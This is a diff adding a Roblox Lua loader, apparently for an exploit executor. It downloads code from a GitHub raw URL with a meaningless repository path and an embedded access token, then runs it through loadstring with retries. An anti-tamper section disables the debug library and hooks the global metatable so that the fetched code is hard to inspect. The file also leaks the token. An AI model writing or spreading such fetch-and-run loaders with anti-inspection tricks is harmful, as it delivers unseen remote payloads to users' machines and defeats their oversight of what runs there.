@@ -1,0 +1,203 @@
+local Loader = {
+    url = "https://raw.githubusercontent.com/Klaiz11/wsgdfsdfsdfdsfggggggggggggggdfgrtgrgbdfgbdgbdfgfdgbdf/refs/heads/main/sdasdsadsadsaasdvasdasvdsad?token=GHSAT0AAAAAAEAUVY6BFNDBEWLPJ4MGIO5G2RZJZDA",
+    retryDelay = 2,
+    maxRetries = 5,
+    loaded = false,
+    startTime = tick(),
+}
+
+local Antitamper = {
+    _protected = {},
+    _active = true,
+    _detections = 0,
+    _maxDetections = 3,
+    _initialized = false,
+}
+
+function Antitamper:protect()
+    if self._initialized then return end
+    
+    local important = {
+        "print", "warn", "error", 
+        "loadstring", "pcall", "xpcall",
+        "task", "spawn", "delay"
+    }
+    
+    for _, name in pairs(important) do
+        self._protected[name] = _G[name]
+    end
+    
+    if _G.debug then
+        local debugMethods = {"getinfo", "getupvalue", "setupvalue", "getlocal", "setlocal"}
+        for _, method in pairs(debugMethods) do
+            if _G.debug[method] then
+                _G.debug[method] = function() return nil end
+            end
+        end
+    end
+    
+    local mt = getmetatable(_G)
+    if mt then
+        local oldNewIndex = mt.__newindex
+        mt.__newindex = function(t, k, v)
+            if Antitamper._protected[k] then
+                Antitamper._detections = Antitamper._detections + 1
+                if Antitamper._detections >= Antitamper._maxDetections then
+                    Antitamper._active = false
+                end
+                return
+            end
+            if oldNewIndex then
+                oldNewIndex(t, k, v)
+            else
+                rawset(t, k, v)
+            end
+        end
+    end
+    
+    self._initialized = true
+end
+
+function Antitamper:check()
+    if not self._active then return false end
+    
+    for name, func in pairs(self._protected) do
+        if _G[name] ~= func then
+            self._detections = self._detections + 1
+            if self._detections >= self._maxDetections then
+                self._active = false
+                return false
+            end
+        end
+    end
+    return true
+end
+
+function Loader:fetch()
+    if not Antitamper:check() then
+        return false, "Antitamper triggered"
+    end
+    
+    local success, result = pcall(function()
+        return game:HttpGet(self.url, true)
+    end)
+    
+    if success and result and #result > 100 then
+        return true, result
+    end
+    return false, result or "Empty or invalid response"
+end
+
+function Loader:validate(code)
+    local dangerous = {
+        "getfenv", "setfenv", "debug%.",
+        "string.dump", "require%s*%(.*%)"
+    }
+    
+    for _, pattern in pairs(dangerous) do
+        if string.find(code, pattern) then
+            return false, "Dangerous pattern detected: " .. pattern
+        end
+    end
+    return true, "Valid"
+end
+
+function Loader:execute(code)
+    if not Antitamper:check() then
+        return false, "Antitamper triggered"
+    end
+    
+    local valid, msg = self:validate(code)
+    if not valid then
+        return false, msg
+    end
+    
+    local env = {
+        print = print,
+        warn = warn,
+        error = error,
+        pcall = pcall,
+        xpcall = xpcall,
+        task = task,
+        wait = wait,
+        tick = tick,
+        game = game,
+        workspace = workspace,
+        Players = game:GetService("Players"),
+        RunService = game:GetService("RunService"),
+        HttpService = game:GetService("HttpService"),
+        UserInputService = game:GetService("UserInputService"),
+        Vector3 = Vector3,
+        Vector2 = Vector2,
+        Color3 = Color3,
+        UDim2 = UDim2,
+        Instance = Instance,
+        TweenService = game:GetService("TweenService"),
+    }
+    
+    setmetatable(env, {
+        __index = function(_, key)
+            if key == "_G" or key == "getfenv" or key == "setfenv" then
+                return nil
+            end
+            return _G[key]
+        end
+    })
+    
+    local fn, err = loadstring(code)
+    if not fn then
+        return false, "Compilation error: " .. tostring(err)
+    end
+    
+    setfenv(fn, env)
+    local ok, err2 = pcall(fn)
+    if not ok then
+        return false, "Runtime error: " .. tostring(err2)
+    end
+    
+    return true, "Success"
+end
+
+function Loader:load()
+    Antitamper:protect()
+    
+    for attempt = 1, self.maxRetries do
+        if not Antitamper:check() then
+            return false
+        end
+        
+        local ok, content = self:fetch()
+        
+        if ok then
+            local executed, msg = self:execute(content)
+            if executed then
+                self.loaded = true
+                return true
+            end
+        end
+        
+        if attempt < self.maxRetries then
+            task.wait(self.retryDelay)
+        end
+    end
+    
+    return false
+end
+
+function Loader:startWatchdog()
+    task.spawn(function()
+        while self.loaded do
+            task.wait(10)
+            
+            if not Antitamper:check() then
+                self.loaded = false
+                break
+            end
+        end
+    end)
+end
+
+local success = Loader:load()
+if success then
+    Loader:startWatchdog()
+end
